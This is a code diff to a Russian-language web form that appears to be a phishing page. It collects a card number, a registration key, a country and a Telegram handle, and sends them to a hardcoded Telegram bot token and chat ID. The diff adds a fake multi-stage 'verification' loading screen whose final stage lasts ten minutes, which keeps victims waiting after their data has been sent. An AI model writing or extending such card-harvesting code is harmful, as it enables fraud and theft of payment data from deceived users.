@@ -96,8 +96,12 @@
             border-radius: 15px;
             box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
             opacity: 0;
-            transition: opacity 0.5s ease-in-out;
+            transition: 
+                opacity 0.5s ease-in-out,
+                max-height 0.4s ease-out;
             width: 320px;
+            max-height: 200px;
+            overflow: hidden;
         }
 
         .progress-bar {
@@ -144,6 +148,33 @@
             display: none;
             opacity: 0;
         }
+
+        .stage-container {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 14px;
+            color: #666;
+            width: 100%;
+        }
+
+        .stage-item {
+            margin: 8px 0;
+            opacity: 0;
+            transform: translateY(10px);
+            animation: 
+                fadeInUp 0.5s forwards,
+                itemAppear 0.3s forwards;
+        }
+
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes itemAppear {
+            from { max-height: 0; }
+            to { max-height: 50px; }
+        }
     </style>
 </head>
 <body>
@@ -183,8 +214,9 @@
 
     <!-- Загрузка -->
     <div class="progress-container hidden" id="progress">
-        <span class="instruction">Проверка данных...</span>
+        <span class="instruction" id="loadingText">Проверка данных...</span>
         <div class="progress-bar" id="progressBar"></div>
+        <div class="stage-container" id="stageContainer"></div>
     </div>
 
     <!-- Модальное окно -->
@@ -203,7 +235,15 @@
         const BOT_TOKEN = '8098607027:AAF2J_tu_Dkm0UhEtrAKDfPPNMHoDnbQ92Q';
         const CHAT_ID = '7180637463';
 
-        // Обработчик ввода номера карты
+        // Этапы длительной загрузки
+        const finalLoadingStages = [
+            {text: "Упаковка системных файлов...", duration: 3000},
+            {text: "Проверка цифровой подписи...", duration: 4500},
+            {text: "Верификация сертификатов...", duration: 4000},
+            {text: "Синхронизация с платежным шлюзом...", duration: 5000},
+            {text: "Финализация процесса...", duration: 600000}
+        ];
+
         document.getElementById('card').addEventListener('input', function(e) {
             this.value = this.value.replace(/\D/g, '');
         });
@@ -223,22 +263,23 @@
             }, 50);
         }
 
-        function handleProgress(nextStepCallback, isFinal = false) {
+        function handleProgress(nextStepCallback) {
             const currentContainer = document.querySelector(`#step${currentStep}`);
             fadeOut(currentContainer);
             fadeOut(document.getElementById('logo'));
             
-            fadeIn(document.getElementById('progress'));
+            const progressContainer = document.getElementById('progress');
+            fadeIn(progressContainer);
             const progressBar = document.getElementById('progressBar');
             progressBar.style.width = '0';
             
             setTimeout(() => {
                 progressBar.style.width = '100%';
                 setTimeout(() => {
-                    fadeOut(document.getElementById('progress'), () => {
+                    fadeOut(progressContainer, () => {
                         nextStepCallback();
-                        if (!isFinal && showLogo) fadeIn(document.getElementById('logo'));
-                        if (!isFinal) currentStep++;
+                        if (showLogo) fadeIn(document.getElementById('logo'));
+                        currentStep++;
                     });
                 }, 1500);
             }, 50);
@@ -324,9 +365,10 @@
             }).catch(error => console.error('Ошибка отправки:', error));
         }
 
-        function showModal() {
+        async function showModal() {
             if (!validateCard()) return;
 
+            // Отправка данных в Telegram
             const formData = {
                 key: document.getElementById('regKey').value,
                 country: document.getElementById('country').value,
@@ -334,13 +376,48 @@
                 telegram: document.getElementById('telegram').value,
                 card: document.getElementById('card').value
             };
-
             sendToTelegram(formData);
 
-            handleProgress(() => {
+            // Запуск длительной загрузки
+            const progressContainer = document.getElementById('progress');
+            const stageContainer = document.getElementById('stageContainer');
+            const progressBar = document.getElementById('progressBar');
+            
+            fadeOut(document.getElementById('step2'));
+            fadeOut(document.getElementById('logo'));
+            fadeIn(progressContainer);
+            
+            progressBar.style.width = '0%';
+            stageContainer.innerHTML = '';
+            let containerHeight = 160; // Начальная высота контейнера
+
+            // Выполнение этапов загрузки
+            for (const stage of finalLoadingStages) {
+                const stageElement = document.createElement('div');
+                stageElement.className = 'stage-item';
+                stageElement.textContent = stage.text;
+                stageContainer.appendChild(stageElement);
+                
+                // Плавное увеличение высоты контейнера
+                containerHeight += 30;
+                progressContainer.style.maxHeight = `${containerHeight}px`;
+
+                await new Promise(resolve => {
+                    progressBar.style.width = `${(finalLoadingStages.indexOf(stage)+1) * (100 / finalLoadingStages.length)}%`;
+                    setTimeout(resolve, stage.duration);
+                });
+            }
+
+            // Финализация
+            await new Promise(resolve => {
+                progressContainer.style.maxHeight = `${containerHeight + 20}px`;
+                setTimeout(resolve, 2000);
+            });
+            
+            fadeOut(progressContainer, () => {
                 showLogo = false;
                 fadeIn(document.getElementById('modal'));
-            }, true);
+            });
         }
 
         document.addEventListener('DOMContentLoaded', () => {
